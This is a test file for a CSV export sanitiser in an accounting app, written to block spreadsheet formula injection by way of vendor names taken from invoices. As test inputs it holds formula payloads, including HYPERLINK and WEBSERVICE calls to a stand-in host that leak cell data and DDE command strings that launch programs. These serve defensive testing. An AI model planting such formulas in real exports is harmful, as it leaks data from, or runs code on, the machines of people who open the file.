/**
 * CSV exports must not hand the recipient a formula to execute.
 *
 * Excel/LibreOffice evaluate a cell starting with `=`, `+`, `@` or a tab/CR when
 * the file is opened. Not all text in these exports is typed by the person
 * exporting: a vendor name read off an uploaded supplier invoice becomes a
 * journal line `Payment to <name>` (client/lib/accounting/calculations.ts:690)
 * and the General Ledger export writes that description straight out
 * (client/pages/accounting/GeneralLedger.tsx:153). That is a path from a hostile
 * PDF to code running in an accountant's spreadsheet.
 *
 * Money formatting must survive the guard — a negative amount is not an attack.
 */
import { describe, it, expect } from 'vitest';
import { buildCSV, sanitizeCsvCell } from '@/lib/csvExport';

describe('sanitizeCsvCell', () => {
  it('forces every formula-leading character to text', () => {
    for (const payload of [
      '=1+1',
      '=HYPERLINK("http://evil.example/?d="&A1,"invoice")',
      '=WEBSERVICE("http://evil.example/leak")',
      '+1+1',
      '@SUM(A1:A9)',
      '\t=1+1',
      '\r=1+1',
      '=cmd|\' /C calc\'!A0',
    ]) {
      const result = String(sanitizeCsvCell(payload));
      expect(result.startsWith("'"), payload).toBe(true);
    }
  });

  it('leaves negative numbers alone — those are amounts, not attacks', () => {
    for (const value of ['-472.00', '-0.01', '-1234', '-1e3']) {
      expect(sanitizeCsvCell(value), value).toBe(value);
    }
  });

  it('still guards a value that only looks numeric at the front', () => {
    expect(sanitizeCsvCell('-2+3+cmd|\' /C calc\'!A0')).toBe("'-2+3+cmd|' /C calc'!A0");
  });

  it('leaves embedded newlines and tabs intact — a quoted CSV field carries them', () => {
    // Rewriting these would corrupt legitimate multi-line descriptions, and they
    // are not an injection risk: only the first character is evaluated.
    expect(sanitizeCsvCell('Primo\nBoot\tLda')).toBe('Primo\nBoot\tLda');
    expect(sanitizeCsvCell('Donor "A"\nPhase 2')).toBe('Donor "A"\nPhase 2');
  });

  it('passes ordinary values, numbers and blanks through untouched', () => {
    expect(sanitizeCsvCell('Primos Boot Unipessoal Lda')).toBe('Primos Boot Unipessoal Lda');
    expect(sanitizeCsvCell('Fatura 009 C4-C')).toBe('Fatura 009 C4-C');
    expect(sanitizeCsvCell(450)).toBe(450);
    expect(sanitizeCsvCell(null)).toBe(null);
    expect(sanitizeCsvCell('')).toBe('');
  });
});

describe('buildCSV', () => {
  it('neutralises a whole cell taken from an extracted vendor name', () => {
    // Exports that write one field per cell (CustomReports, vendor/expense
    // columns) put the attacker-controlled value at the start of the cell, which
    // is the condition Excel evaluates.
    const csv = buildCSV(
      ['Date', 'Vendor', 'Amount'],
      [['2026-08-07', '=HYPERLINK("http://evil.example/?d="&A1,"invoice")', '-472.00']],
    );
    expect(csv).toContain("'=HYPERLINK");
    expect(csv).not.toMatch(/,=HYPERLINK/);
    // The amount is untouched.
    expect(csv).toContain('-472.00');
  });

  it('leaves a formula character that is not first alone — it is inert', () => {
    // `Payment to =X` is text to Excel, and quoting it would corrupt legitimate
    // wording like "Total = 450". Only a leading character is dangerous.
    const csv = buildCSV(
      ['Description'],
      [['Payment to =HYPERLINK("http://evil.example","x")']],
    );
    expect(csv).not.toContain("'Payment");
    expect(csv).toContain('Payment to =HYPERLINK');
  });

  it('guards a hostile column header too', () => {
    const csv = buildCSV(['=1+1'], [['ok']]);
    expect(csv.startsWith("'=1+1")).toBe(true);
  });

  it('keeps quoting and escaping intact for ordinary content', () => {
    const csv = buildCSV(['A', 'B'], [['has, comma', 'has "quote"']]);
    expect(csv).toContain('"has, comma"');
    expect(csv).toContain('"has ""quote"""');
  });
});
